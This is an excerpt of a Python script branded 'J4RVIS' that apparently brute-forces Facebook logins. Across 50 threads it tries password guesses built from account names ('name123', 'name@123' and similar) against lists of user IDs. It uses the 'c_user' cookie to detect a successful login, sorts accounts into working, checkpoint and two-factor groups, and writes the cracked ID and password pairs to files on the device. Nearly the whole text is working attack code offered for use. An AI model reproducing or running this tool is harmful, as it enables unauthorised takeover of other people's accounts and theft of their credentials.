...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; J4RVIS \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
\033[0m 𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙""")
...
def gml():
    ...
    with ThreadPool(max_workers=50) as yaari:
        ...
        for guru in user:
            ...
            pwx = [kode,kode+kodex,kode+'123',kode+'1234',kode+'@@@',kode+'@123',kodex+'@123']
            yaari.submit(rcrack1,uid,pwx,tl)
    print('  [+] Crack process has been completed')
    print('  [+] Ids saved in ok.txt,cp.txt')
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r [\033[38;5;46mJ4RVIS\033[1;97m] [\033[38;5;45m%s\033[0m/%s] [OK\033[1;97m:-\033[38;5;46m%s\033[1;97m] [CP\033[1;97m:-\033[38;5;196m%s\033[1;97m] [2F\033[1;97m:-\033[38;5;45m%s\033[1;97m] \r'%(loop,tl,len(ok),len(cp),len(twf))),
            sys.stdout.flush()
            ...
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; XIAOMI Redmi Note 9 Pro Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36',}
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/jrvis.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/jrvis-2f.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                  ...
                  #  os.system("play-audio HAMII_CP.mp3")
                    ...
                    open('/sdcard/jrvis-cp.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f' \r\033[m[J4RVIS] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
#Main()
